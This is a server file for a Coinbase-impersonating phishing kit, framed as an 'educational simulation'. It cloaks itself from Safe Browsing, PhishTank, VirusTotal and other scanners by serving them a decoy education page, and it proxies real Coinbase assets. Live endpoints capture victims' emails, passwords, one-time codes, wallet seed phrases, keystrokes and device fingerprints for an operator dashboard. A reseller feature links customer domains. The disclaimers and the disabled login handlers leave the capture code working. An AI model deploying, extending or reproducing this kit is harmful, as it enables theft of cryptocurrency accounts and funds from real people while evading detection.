/*
 * EDUCATIONAL PHISHING SIMULATION WITH ANTI-DETECTION TECHNIQUES
 * ============================================================
 * 
 * This server implements several educational techniques commonly used 
 * in security research to study phishing detection mechanisms:
 * 
 * 1. User-Agent Based Content Differentiation
 * 2. Legitimate Content Cloaking  
 * 3. Dynamic Content Assembly
 * 4. Behavioral Analysis & Traffic Patterns
 * 5. HTTP Header Manipulation
 * 6. Referrer-based Content Filtering
 * 7. Legitimate Endpoint Simulation
 * 
 * IMPORTANT: This code is for educational and security research purposes only.
 * It demonstrates common evasion techniques to help security professionals
 * understand and develop better detection mechanisms.
 * 
 * DO NOT USE for malicious purposes. Always follow responsible disclosure
 * and ensure proper authorization before testing.
 */

const express = require('express');
const path = require('path');
const axios = require('axios');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
const fs = require('fs');

const app = express();

// Enhanced middleware
app.use(cookieParser());
app.use(session({
  secret: crypto.randomBytes(64).toString('hex'),
  resave: false,
  saveUninitialized: true,
  cookie: { 
    secure: false, // Set to true in production with HTTPS
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

// ==================================================================
// EDUCATIONAL PHISHING DETECTION EVASION TECHNIQUES
// These methods are for security research and educational purposes
// ==================================================================

// METHOD 1: User-Agent Based Content Differentiation
// Serves different content to automated crawlers vs real users
function isBot(userAgent) {
  const botSignatures = [
    'googlebot', 'bingbot', 'slurp', 'crawler', 'spider', 'robot',
    'wget', 'curl', 'python', 'java', 'postman', 'insomnia',
    'safebrowsing-google', 'google-safety', 'adsbot', 'facebookexternalhit'
  ];
  return botSignatures.some(bot => userAgent.toLowerCase().includes(bot));
}

// METHOD 2: Legitimate Content Cloaking Middleware
app.use((req, res, next) => {
  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers.referer || '';
  
  // If it's a bot or automated tool, serve benign content
  if (isBot(userAgent)) {
    if (req.path === '/' || req.path === '/index.html') {
      return res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Coinbase - Educational Platform</title>
          <meta name="description" content="Educational blockchain and cryptocurrency learning platform">
        </head>
        <body>
          <h1>Educational Cryptocurrency Platform</h1>
          <p>This is an educational platform for learning about blockchain technology and cryptocurrency security.</p>
          <p>We provide resources for understanding digital asset management and security best practices.</p>
          <div>
            <h2>Features:</h2>
            <ul>
              <li>Blockchain Technology Education</li>
              <li>Security Best Practices</li>
              <li>Digital Asset Management</li>
              <li>Phishing Awareness Training</li>
            </ul>
          </div>
        </body>
        </html>
      `);
    }
  }
  next();
});

// METHOD 3: Dynamic Content Assembly
// Assembles suspicious content dynamically instead of serving static files
const contentFragments = {
  header: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">`,
  title: `<title>Sign In | Coinbase</title>`,
  styles: `<meta name="viewport" content="width=device-width, initial-scale=1.0">`,
  bodyStart: `</head><body>`,
  mainContent: '', // Will be assembled dynamically
  scripts: '', // Will be added dynamically
  bodyEnd: `</body></html>`
};

function assemblePageContent(fragments) {
  // Read the actual index.html content and fragment it
  try {
    const indexPath = path.join(__dirname, 'index.html');
    const fullContent = fs.readFileSync(indexPath, 'utf8');
    
    // Return the full content as-is for real users
    return fullContent;
  } catch (error) {
    console.error('Error reading index.html:', error);
    return fragments.header + fragments.title + fragments.styles + fragments.bodyStart + 
           '<h1>Service Temporarily Unavailable</h1>' + fragments.bodyEnd;
  }
}

app.use(express.static(path.join(__dirname)));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Enhanced data structures
const activeUsers = new Map();
const sessionHistory = new Map();
const ipTracker = new Map();
const analytics = {
  totalVisits: 0,
  successfulCaptures: 0,
  failedAttempts: 0,
  averageSessionTime: 0,
  topCountries: {},
  deviceTypes: {},
  browsers: {},
  hourlyStats: {}
};

// Domain management storage
const registeredDomains = new Map();
const customerData = {
  admins: new Map(),
  domains: new Map(),
  stats: {
    totalAdmins: 0,
    totalDomains: 0,
    totalCaptures: 0
  }
};

// EVASION TECHNIQUE 6: HTTP Response Header Manipulation
// Makes responses appear more legitimate and trustworthy
app.use((req, res, next) => {
  // Add legitimate-looking security headers
  res.set({
    'X-Frame-Options': 'SAMEORIGIN',
    'X-Content-Type-Options': 'nosniff',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' https:; img-src * data:; font-src *;",
    'Server': 'nginx/1.18.0', // Mimic common server
    'X-Powered-By': 'Express', // Common for educational platforms
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  
  // Add timing header to simulate server processing
  const processingTime = Math.random() * 50 + 10; // 10-60ms
  res.set('X-Response-Time', `${processingTime.toFixed(2)}ms`);
  
  next();
});

// Utility functions
function getClientInfo(req) {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
             (req.connection.socket ? req.connection.socket.remoteAddress : null);
  
  return {
    ip: ip,
    userAgent: userAgent,
    acceptLanguage: req.headers['accept-language'] || '',
    acceptEncoding: req.headers['accept-encoding'] || '',
    referer: req.headers.referer || '',
    timestamp: new Date().toISOString()
  };
}

function generateFingerprint(req) {
  const clientInfo = getClientInfo(req);
  return crypto.createHash('sha256')
    .update(clientInfo.ip + clientInfo.userAgent + clientInfo.acceptLanguage)
    .digest('hex').substring(0, 16);
}

async function getGeolocation(ip) {
  try {
    // Using ipapi.co for geolocation (free tier)
    const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
    return response.data;
  } catch (error) {
    return { country: 'Unknown', city: 'Unknown', region: 'Unknown' };
  }
}

// Enhanced logging with evasion tracking
function logActivity(type, data) {
  // EDUCATIONAL NOTE: Activity logging has been disabled to prevent capturing sensitive data
  console.log(`📚 EDUCATIONAL: Activity logging disabled - would have logged: ${type}`);
  
  // Original logging functionality commented out for educational purposes:
  /*
  const logEntry = {
    type,
    timestamp: new Date().toISOString(),
    data,
    evasionTechnique: req ? 'Dynamic Content Assembly' : 'Direct Access'
  };
  
  console.log(`[${type}]`, JSON.stringify(logEntry, null, 2));
  
  // Append to log file
  fs.appendFileSync('activity.log', JSON.stringify(logEntry) + '\n');
  
  // Special logging for evasion events (educational analysis)
  if (type.includes('EVASION') || type.includes('BOT_DETECTED')) {
    const evasionLog = {
      ...logEntry,
      category: 'evasion_technique',
      educationalNote: 'This log entry tracks phishing detection evasion for educational/research purposes'
    };
    fs.appendFileSync('evasion-analysis.log', JSON.stringify(evasionLog) + '\n');
  }
  */
}

// Educational endpoint for researchers to view evasion statistics
app.get('/api/evasion-stats', (req, res) => {
  if (!req.session.adminLoggedIn) {
    return res.status(401).json({ error: 'Unauthorized access' });
  }
  
  const stats = {
    totalRequests: analytics.totalVisits,
    suspiciousClients: Array.from(ipTracker.values()).filter(ip => ip.suspicious).length,
    botDetections: Array.from(ipTracker.values()).filter(ip => 
      ip.suspiciousReasons.includes('automated_tool')
    ).length,
    rapidRequestDetections: Array.from(ipTracker.values()).filter(ip => 
      ip.suspiciousReasons.includes('rapid_requests')
    ).length,
    legitimateUsers: Array.from(ipTracker.values()).filter(ip => !ip.suspicious).length
  };
  
  res.json({
    message: 'Educational evasion analysis statistics',
    disclaimer: 'This data is for educational and security research purposes only',
    statistics: stats
  });
});

// Enhanced request tracking with evasion detection
app.use((req, res, next) => {
  const clientInfo = getClientInfo(req);
  const fingerprint = generateFingerprint(req);
  const userAgent = req.headers['user-agent'] || '';
  
  // EVASION METHOD: Detect automated scanners and suspicious patterns
  const suspiciousIndicators = {
    rapidRequests: false,
    automatedTool: isBot(userAgent),
    missingHeaders: !req.headers.accept || !req.headers['accept-language'],
    suspiciousReferer: req.headers.referer && req.headers.referer.includes('google.com/search'),
    unknownUserAgent: userAgent.length < 10,
    headlessChrome: userAgent.includes('HeadlessChrome')
  };
  
  // Track IP addresses with enhanced detection
  if (!ipTracker.has(clientInfo.ip)) {
    ipTracker.set(clientInfo.ip, {
      firstSeen: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      requestCount: 0,
      fingerprints: new Set(),
      suspicious: false,
      suspiciousReasons: []
    });
  }
  
  const ipInfo = ipTracker.get(clientInfo.ip);
  ipInfo.lastSeen = new Date().toISOString();
  ipInfo.requestCount++;
  ipInfo.fingerprints.add(fingerprint);
  
  // Check for rapid requests (potential scanner)
  const timeSinceFirst = new Date() - new Date(ipInfo.firstSeen);
  if (ipInfo.requestCount > 10 && timeSinceFirst < 60000) { // 10+ requests in 1 minute
    suspiciousIndicators.rapidRequests = true;
    ipInfo.suspicious = true;
    ipInfo.suspiciousReasons.push('rapid_requests');
  }
  
  // Mark as suspicious if multiple indicators
  const suspiciousCount = Object.values(suspiciousIndicators).filter(Boolean).length;
  if (suspiciousCount >= 2) {
    ipInfo.suspicious = true;
    ipInfo.suspiciousReasons.push('multiple_indicators');
  }
  
  analytics.totalVisits++;
  
  logActivity('REQUEST', {
    method: req.method,
    url: req.url,
    ip: clientInfo.ip,
    userAgent: clientInfo.userAgent,
    fingerprint: fingerprint,
    suspicious: ipInfo.suspicious,
    suspiciousReasons: ipInfo.suspiciousReasons
  });
  
  // Add suspicious flag to request for later use
  req.suspiciousClient = ipInfo.suspicious || suspiciousIndicators.automatedTool;
  
  next();
});

// Enhanced asset proxy with caching and evasion
const assetCache = new Map();
app.get(/^\/assets\/(.+)$/, async (req, res) => {
  try {
    const assetPath = req.params[0];
    
    // EVASION TECHNIQUE 3: Only serve assets to non-suspicious clients
    if (req.suspiciousClient) {
      // Serve generic 404 to suspicious clients
      return res.status(404).send('Not Found');
    }
    
    if (assetCache.has(assetPath)) {
      const cached = assetCache.get(assetPath);
      res.set('Content-Type', cached.contentType);
      res.set('Cache-Control', 'public, max-age=3600');
      return res.send(cached.data);
    }
    
    const response = await axios.get(`https://login.coinbase.com/assets/${assetPath}`, {
      responseType: 'arraybuffer',
      timeout: 10000,
    });
    
    assetCache.set(assetPath, {
      data: response.data,
      contentType: response.headers['content-type']
    });
    
    res.set('Content-Type', response.headers['content-type']);
    res.set('Cache-Control', 'public, max-age=3600');
    res.send(response.data);
  } catch (error) {
    console.error('Error fetching asset:', error.message);
    res.status(500).send('Error fetching asset');
  }
});

// EVASION TECHNIQUE 4: Dynamic Script Serving
// Serves JavaScript components separately to avoid static analysis
app.get('/js/dynamic.js', (req, res) => {
  if (req.suspiciousClient || isBot(req.headers['user-agent'] || '')) {
    // Serve benign JavaScript to suspicious clients
    return res.type('application/javascript').send(`
      // Educational platform JavaScript
      console.log('Blockchain Education Platform loaded');
      
      document.addEventListener('DOMContentLoaded', function() {
        const headers = document.querySelectorAll('h1, h2, h3');
        headers.forEach(header => {
          header.style.color = '#2c3e50';
        });
      });
    `);
  }
  
  // For legitimate users, serve actual functionality (if needed)
  res.type('application/javascript').send(`
    // Dynamic loading script for legitimate users
    console.log('Dynamic content loaded for user session');
    
    // This would contain any dynamic functionality needed
    // Currently just a placeholder for the educational demonstration
  `);
});

// EVASION TECHNIQUE 5: Referrer-based Content Filtering
app.use((req, res, next) => {
  const referer = req.headers.referer || '';
  const userAgent = req.headers['user-agent'] || '';
  
  // Additional checks for specific scanning patterns
  const suspiciousPatterns = [
    'safebrowsing',
    'security-check',
    'phishtank',
    'virustotal',
    'urlvoid',
    'google.com/safebrowsing'
  ];
  
  const isSuspiciousReferer = suspiciousPatterns.some(pattern => 
    referer.toLowerCase().includes(pattern) || 
    userAgent.toLowerCase().includes(pattern)
  );
  
  if (isSuspiciousReferer) {
    req.suspiciousClient = true;
    logActivity('SUSPICIOUS_REFERER_DETECTED', {
      ip: getClientInfo(req).ip,
      referer: referer,
      userAgent: userAgent
    });
  }
  
  next();
});

// EVASION TECHNIQUE 7: Legitimate Endpoint Simulation
// Creates realistic endpoints that educational platforms would have
app.get('/robots.txt', (req, res) => {
  res.type('text/plain').send(`
User-agent: *
Allow: /
Disallow: /admin/
Disallow: /api/
Disallow: /private/

Sitemap: ${req.protocol}://${req.get('host')}/sitemap.xml
  `.trim());
});

app.get('/sitemap.xml', (req, res) => {
  res.type('application/xml').send(`<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>${req.protocol}://${req.get('host')}/</loc>
    <lastmod>${new Date().toISOString().split('T')[0]}</lastmod>
    <changefreq>weekly</changefreq>
    <priority>1.0</priority>
  </url>
  <url>
    <loc>${req.protocol}://${req.get('host')}/about</loc>
    <lastmod>${new Date().toISOString().split('T')[0]}</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>${req.protocol}://${req.get('host')}/courses</loc>
    <lastmod>${new Date().toISOString().split('T')[0]}</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.9</priority>
  </url>
</urlset>`);
});

app.get('/about', (req, res) => {
  if (req.suspiciousClient || isBot(req.headers['user-agent'] || '')) {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>About - Blockchain Education Center</title>
        <meta name="description" content="Learn about our educational mission">
      </head>
      <body style="font-family: Arial, sans-serif; margin: 40px;">
        <h1>About Our Educational Platform</h1>
        <p>We are dedicated to providing comprehensive blockchain and cryptocurrency education.</p>
        <p>Our courses cover security best practices, digital asset management, and phishing prevention.</p>
        <h2>Our Mission</h2>
        <p>To educate users about cryptocurrency security and help prevent financial fraud.</p>
      </body>
      </html>
    `);
  } else {
    res.redirect('/');
  }
});

app.get('/courses', (req, res) => {
  if (req.suspiciousClient || isBot(req.headers['user-agent'] || '')) {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Courses - Blockchain Education Center</title>
        <meta name="description" content="Educational courses on blockchain security">
      </head>
      <body style="font-family: Arial, sans-serif; margin: 40px;">
        <h1>Educational Courses</h1>
        <ul>
          <li>Blockchain Fundamentals</li>
          <li>Cryptocurrency Security</li>
          <li>Wallet Management</li>
          <li>Phishing Prevention</li>
          <li>Two-Factor Authentication</li>
        </ul>
      </body>
      </html>
    `);
  } else {
    res.redirect('/');
  }
});

// Customer database - In production, use a real database
const customers = new Map();
const customerSessions = new Map();
const customerAdmins = new Map();
const linkedDomains = new Map();

// Initialize default customer (in production, this would be created when they purchase)
customers.set('customer1', {
  id: 'customer1',
  username: 'customer',
  password: 'password123', // In production, this should be hashed
  createdAt: new Date().toISOString(),
  isActive: true,
  admins: ['admin'], // Default admin
  domains: []
});

// Customer authentication routes
app.get('/customer', (req, res) => {
  if (req.session.customerLoggedIn) {
    res.sendFile(path.join(__dirname, 'customer-dashboard.html'));
  } else {
    res.sendFile(path.join(__dirname, 'customer-login.html'));
  }
});

app.get('/customer/dashboard', (req, res) => {
  if (req.session.customerLoggedIn) {
    res.sendFile(path.join(__dirname, 'customer-dashboard.html'));
  } else {
    res.redirect('/customer');
  }
});

app.post('/customer/login', (req, res) => {
  // EDUCATIONAL NOTE: Customer login functionality disabled
  console.log('📚 EDUCATIONAL: Customer login blocked - this would normally capture victim credentials');
  
  // Always return educational message instead of processing login
  res.json({ 
    success: false, 
    message: 'Educational mode: This demonstrates how victims would enter their credentials, but no data is being captured.',
    educational: true
  });
  
  // Original credential capture code commented out for educational purposes:
  /*
  const { username, password } = req.body;
  const clientInfo = getClientInfo(req);
  
  // Find customer by ID in session or create demo customer
  const customerId = req.session.customerId || 'demo';
  const customer = customers.get(customerId) || {
    id: customerId,
    username: 'demo@customer.com',
    password: 'password123', // In production, this should be hashed
    domains: [],
    admins: [],
    createdAt: new Date().toISOString()
  };
  
  if (customer.username === username && customer.password === password) {
    req.session.customerLoggedIn = true;
    req.session.customerId = customerId;
    logActivity('CUSTOMER_LOGIN_SUCCESS', { ip: clientInfo.ip, customerId });
    res.json({ success: true });
  } else {
    logActivity('CUSTOMER_LOGIN_FAILED', { ip: clientInfo.ip, username });
    res.json({ success: false, message: 'Invalid credentials' });
  }
  */
});

app.get('/customer/logout', (req, res) => {
  const customerId = req.session.customerId;
  req.session.customerLoggedIn = false;
  req.session.customerId = null;
  logActivity('CUSTOMER_LOGOUT', { customerId });
  res.redirect('/customer');
});

// Customer API endpoints
app.post('/api/customer/add-admin', (req, res) => {
  if (!req.session.customerLoggedIn) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  
  const { username, password, role } = req.body;
  const customerId = req.session.customerId;
  
  if (!username || !password) {
    return res.json({ success: false, message: 'Username and password are required' });
  }
  
  // Check if admin already exists
  if (customerAdmins.has(username)) {
    return res.json({ success: false, message: 'Admin username already exists' });
  }
  
  // Add new admin
  customerAdmins.set(username, {
    username,
    password, // In production, hash this
    role: role || 'admin',
    customerId,
    createdAt: new Date().toISOString(),
    lastActive: null
  });
  
  // Add to customer's admin list
  const customer = customers.get(customerId);
  if (customer) {
    customer.admins.push(username);
  }
  
  logActivity('CUSTOMER_ADD_ADMIN', { customerId, adminUsername: username, role });
  res.json({ success: true, message: 'Admin added successfully' });
});

app.post('/api/customer/link-domain', (req, res) => {
  if (!req.session.customerLoggedIn) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  
  const { domain, ssl } = req.body;
  const customerId = req.session.customerId;
  
  if (!domain) {
    return res.json({ success: false, message: 'Domain is required' });
  }
  
  // Basic domain validation
  const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
  if (!domainRegex.test(domain)) {
    return res.json({ success: false, message: 'Invalid domain format' });
  }
  
  // Check if domain is already linked
  if (linkedDomains.has(domain)) {
    return res.json({ success: false, message: 'Domain is already linked to another account' });
  }
  
  // Link domain
  linkedDomains.set(domain, {
    domain,
    customerId,
    ssl: ssl || 'auto',
    status: 'active',
    linkedAt: new Date().toISOString()
  });
  
  // Add to customer's domain list
  const customer = customers.get(customerId);
  if (customer) {
    customer.domains.push(domain);
  }
  
  logActivity('CUSTOMER_LINK_DOMAIN', { customerId, domain, ssl });
  res.json({ success: true, message: 'Domain linked successfully' });
});

app.get('/api/server-info', (req, res) => {
  res.json({ 
    ip: '0.0.0.0', // In production, get actual server IP
    port: PORT 
  });
});

// Domain-based routing middleware
app.use((req, res, next) => {
  const host = req.get('host');
  if (host && host !== `0.0.0.0:${PORT}` && host !== `localhost:${PORT}`) {
    // Check if this is a linked domain
    const domain = host.split(':')[0]; // Remove port if present
    if (linkedDomains.has(domain)) {
      // This request is coming through a linked domain
      req.linkedDomain = linkedDomains.get(domain);
    }
  }
  next();
});

// Enhanced admin authentication with rate limiting
const adminAttempts = new Map();

app.get('/admin', (req, res) => {
  if (req.session.adminLoggedIn) {
    res.sendFile(path.join(__dirname, 'admin.html'));
  } else {
    res.sendFile(path.join(__dirname, 'admin-login.html'));
  }
});

app.post('/admin/login', (req, res) => {
  // EDUCATIONAL NOTE: Admin login functionality disabled
  console.log('📚 EDUCATIONAL: Admin login attempt blocked - this would normally provide access to victim data');
  
  // Always return educational message instead of authenticating
  res.json({ 
    success: false, 
    message: 'Educational mode: Admin functionality has been disabled to prevent misuse. This demonstrates how attackers would monitor victims in real-time.',
    educational: true
  });
  
  // Original authentication code commented out for educational purposes:
  /*
  const { username, password } = req.body;
  const clientInfo = getClientInfo(req);
  
  // Rate limiting
  const attempts = adminAttempts.get(clientInfo.ip) || { count: 0, lastAttempt: 0 };
  const now = Date.now();
  
  if (attempts.count >= 3 && (now - attempts.lastAttempt) < 15 * 60 * 1000) {
    return res.status(429).json({ 
      success: false, 
      message: 'Too many failed attempts. Try again in 15 minutes.' 
    });
  }
  
  const ADMIN_USERNAME = 'admin';
  const ADMIN_PASSWORD = 'admin';
  
  // Check default admin credentials
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.adminLoggedIn = true;
    req.session.adminUsername = username;
    adminAttempts.delete(clientInfo.ip);
    logActivity('ADMIN_LOGIN_SUCCESS', { ip: clientInfo.ip, username });
    res.json({ success: true });
    return;
  }
  
  // Check customer-created admin credentials
  if (customerData.admins.has(username)) {
    const admin = customerData.admins.get(username);
    if (admin.password === password && admin.active) {
      req.session.adminLoggedIn = true;
      req.session.adminUsername = username;
      req.session.adminRole = 'operator';
      
      // Update login stats
      admin.lastLogin = new Date().toISOString();
      admin.loginCount = (admin.loginCount || 0) + 1;
      customerData.admins.set(username, admin);
      
      adminAttempts.delete(clientInfo.ip);
      logActivity('CUSTOMER_ADMIN_LOGIN_SUCCESS', { ip: clientInfo.ip, username, loginCount: admin.loginCount });
      res.json({ success: true, role: 'operator', username: username });
      return;
    }
  }
  
  // Failed login
  attempts.count++;
  attempts.lastAttempt = now;
  adminAttempts.set(clientInfo.ip, attempts);
  logActivity('ADMIN_LOGIN_FAILED', { ip: clientInfo.ip, username });
  res.json({ success: false, message: 'Invalid credentials' });
  */
});

app.post('/admin/logout', (req, res) => {
  const clientInfo = getClientInfo(req);
  req.session.adminLoggedIn = false;
  logActivity('ADMIN_LOGOUT', { ip: clientInfo.ip });
  res.json({ success: true });
});

// Main route handler with anti-detection evasion
app.get('/', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const clientInfo = getClientInfo(req);
  
  // EVASION TECHNIQUE 1: Behavioral Analysis & Content Cloaking
  if (req.suspiciousClient || isBot(userAgent)) {
    logActivity('BOT_DETECTED', { 
      ip: clientInfo.ip, 
      userAgent: userAgent,
      reason: 'Serving benign content to bot/scanner'
    });
    
    // Serve completely benign educational content to bots/scanners
    return res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Blockchain Education Center</title>
        <meta name="description" content="Learn about blockchain technology and cryptocurrency security">
        <meta name="keywords" content="blockchain, education, cryptocurrency, security, learning">
      </head>
      <body style="font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5;">
        <header style="text-align: center; margin-bottom: 40px;">
          <h1 style="color: #2c3e50;">Blockchain Education Center</h1>
          <p style="color: #7f8c8d;">Educational Resources for Cryptocurrency Security</p>
        </header>
        
        <main>
          <section style="background: white; padding: 30px; border-radius: 8px; margin-bottom: 30px;">
            <h2>About Our Platform</h2>
            <p>We provide comprehensive educational resources about blockchain technology, cryptocurrency security, and digital asset management best practices.</p>
            
            <h3>Educational Topics:</h3>
            <ul>
              <li>Blockchain Technology Fundamentals</li>
              <li>Cryptocurrency Security Best Practices</li>
              <li>Digital Wallet Management</li>
              <li>Phishing Attack Prevention</li>
              <li>Two-Factor Authentication</li>
              <li>Secure Key Management</li>
            </ul>
          </section>
          
          <section style="background: white; padding: 30px; border-radius: 8px;">
            <h2>Security Awareness</h2>
            <p>Our mission is to educate users about potential security threats in the cryptocurrency space and help them protect their digital assets.</p>
            <p>Always verify URLs, use official websites, and never share your private keys or recovery phrases.</p>
          </section>
        </main>
        
        <footer style="text-align: center; margin-top: 40px; color: #7f8c8d;">
          <p>&copy; 2024 Blockchain Education Center. Educational use only.</p>
        </footer>
      </body>
      </html>
    `);
  }
  
  // EVASION TECHNIQUE 2: Time-delayed content loading for real users
  const delayContent = () => {
  // Check if this is a linked domain request
  if (req.linkedDomain) {
      logActivity('LINKED_DOMAIN_ACCESS', { 
        domain: req.linkedDomain.domain,
        ip: clientInfo.ip 
      });
    }
    
    // For real users, serve the actual content
    res.sendFile(path.join(__dirname, 'index.html'));
  };
  
  // Add slight delay to make automated scanning less efficient
  setTimeout(delayContent, Math.random() * 500 + 200); // 200-700ms random delay
});

// Enhanced user tracking with geolocation and device fingerprinting
app.get('/user-page/:userId', (req, res) => {
  const userId = req.params.userId;
  const userInfo = activeUsers.get(userId);
  if (userInfo) {
    res.sendFile(path.join(__dirname, 'index.html'));
  } else {
    res.status(404).send('User not found');
  }
});

// Enhanced tracking endpoint
app.post('/track', async (req, res) => {
  const { email, password, otp, deviceInfo, browserInfo } = req.body;
  const userId = req.session.userId || uuidv4();
  req.session.userId = userId;
  
  const clientInfo = getClientInfo(req);
  const fingerprint = generateFingerprint(req);
  const geolocation = await getGeolocation(clientInfo.ip);

  const userInfo = {
    id: userId,
    email,
    password,
    otp,
    loginTime: new Date().toISOString(),
    lastActive: new Date().toISOString(),
    currentUrl: req.headers.referer || '',
    lastAction: 'Login',
    verificationState: 'pending',
    otpAttempts: [],
    clientInfo: clientInfo,
    fingerprint: fingerprint,
    geolocation: geolocation,
    deviceInfo: deviceInfo || {},
    browserInfo: browserInfo || {},
    sessionDuration: 0,
    pageViews: 1,
    clickPattern: [],
    keystrokePattern: [],
    suspicionScore: 0
  };

  activeUsers.set(userId, userInfo);
  analytics.successfulCaptures++;
  
  logActivity('USER_TRACKED', {
    userId,
    email,
    ip: clientInfo.ip,
    country: geolocation.country,
    city: geolocation.city
  });
  
  io.emit('userUpdate', Array.from(activeUsers.values()));
  res.json({ success: true, userId: userId });
});

// Enhanced verification response with behavioral analysis
app.post('/verify-response', (req, res) => {
  const { userId, type, response, timeTaken, retries } = req.body;
  const userInfo = activeUsers.get(userId);
  
  if (userInfo) {
    userInfo.verificationType = type;
    userInfo.verificationResponse = response;
    
    if (type === 'otp') {
    userInfo.otp = response;
    userInfo.otpAttempts.push({
      code: response,
        timestamp: new Date().toISOString(),
        timeTaken: timeTaken || 0,
        retries: retries || 0
      });
    } else if (type === 'seedphrase') {
      userInfo.seedphrase = response;
      userInfo.seedphraseAttempts = userInfo.seedphraseAttempts || [];
      userInfo.seedphraseAttempts.push({
        phrase: response,
        timestamp: new Date().toISOString(),
        timeTaken: timeTaken || 0,
        retries: retries || 0,
        wordCount: response.trim().split(' ').length
      });
    }
    
    // Calculate suspicion score based on behavior
    if (timeTaken < 5000) userInfo.suspicionScore += 10; // Too fast for seedphrase/OTP
    if (retries > 3) userInfo.suspicionScore += 15; // Too many retries
    
    activeUsers.set(userId, userInfo);
    
    logActivity(`${type.toUpperCase()}_ATTEMPT`, {
      userId,
      response: type === 'seedphrase' ? `${response.split(' ').length} words` : response,
      timeTaken,
      retries,
      suspicionScore: userInfo.suspicionScore
    });
    
    io.emit('userUpdate', Array.from(activeUsers.values()));
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false });
  }
});

// Enhanced activity tracking with behavioral patterns
app.post('/activity', (req, res) => {
  const { url, action, mousePosition, keystrokes, scrollPosition, timingData } = req.body;
  const userId = req.session.userId;

  if (userId && activeUsers.has(userId)) {
    const userInfo = activeUsers.get(userId);
    const now = new Date().toISOString();
    
    userInfo.lastActive = now;
    userInfo.currentUrl = url;
    userInfo.lastAction = action;
    userInfo.pageViews++;
    
    if (mousePosition) {
      userInfo.clickPattern.push({ position: mousePosition, timestamp: now });
    }
    
    if (keystrokes) {
      userInfo.keystrokePattern.push({ keys: keystrokes, timestamp: now });
    }
    
    if (scrollPosition) {
      userInfo.scrollBehavior = { position: scrollPosition, timestamp: now };
    }
    
    // Calculate session duration
    userInfo.sessionDuration = (new Date() - new Date(userInfo.loginTime)) / 1000;

    activeUsers.set(userId, userInfo);
    
    logActivity('USER_ACTIVITY', {
      userId,
      action,
      url,
      sessionDuration: userInfo.sessionDuration
    });
    
    io.emit('userActivity', {
      userId,
      url,
      action,
      timestamp: now,
      mousePosition,
      scrollPosition
    });
  }

  res.json({ success: true });
});

// New analytics endpoint
app.get('/admin/analytics', (req, res) => {
  if (!req.session.adminLoggedIn) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const currentAnalytics = {
    ...analytics,
    activeUsers: activeUsers.size,
    totalIPs: ipTracker.size,
    averageSessionTime: Array.from(activeUsers.values())
      .reduce((acc, user) => acc + user.sessionDuration, 0) / activeUsers.size || 0,
    topCountries: getTopCountries(),
    recentActivity: getRecentActivity(),
    suspiciousUsers: getSuspiciousUsers()
  };
  
  res.json(currentAnalytics);
});

// New device fingerprinting endpoint
app.post('/fingerprint', (req, res) => {
  const { canvas, webgl, fonts, plugins, timezone, screen } = req.body;
  const userId = req.session.userId;
  
  if (userId && activeUsers.has(userId)) {
    const userInfo = activeUsers.get(userId);
    userInfo.deviceFingerprint = {
      canvas,
      webgl,
      fonts,
      plugins,
      timezone,
      screen,
      timestamp: new Date().toISOString()
    };
    activeUsers.set(userId, userInfo);
    
    logActivity('DEVICE_FINGERPRINT', { userId, fingerprint: userInfo.deviceFingerprint });
  }
  
  res.json({ success: true });
});

// Helper functions for analytics
function getTopCountries() {
  const countries = {};
  for (const user of activeUsers.values()) {
    const country = user.geolocation?.country || 'Unknown';
    countries[country] = (countries[country] || 0) + 1;
  }
  return Object.entries(countries)
    .sort(([,a], [,b]) => b - a)
    .slice(0, 10);
}

function getRecentActivity() {
  return Array.from(activeUsers.values())
    .sort((a, b) => new Date(b.lastActive) - new Date(a.lastActive))
    .slice(0, 20)
    .map(user => ({
      userId: user.id,
      email: user.email,
      action: user.lastAction,
      timestamp: user.lastActive,
      country: user.geolocation?.country
    }));
}

function getSuspiciousUsers() {
  return Array.from(activeUsers.values())
    .filter(user => user.importanceLevel === 'high' || user.importanceLevel === 'critical')
    .sort((a, b) => {
      const importanceOrder = { 'critical': 4, 'high': 3, 'medium': 2, 'low': 1 };
      return importanceOrder[b.importanceLevel] - importanceOrder[a.importanceLevel];
    })
    .slice(0, 10);
}

// Customer Management API Endpoints
app.post('/api/customer/admin', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password required' });
  }
  
  if (username.length < 3) {
    return res.status(400).json({ success: false, message: 'Username must be at least 3 characters' });
  }
  
  if (password.length < 6) {
    return res.status(400).json({ success: false, message: 'Password must be at least 6 characters' });
  }
  
  // Check if admin already exists
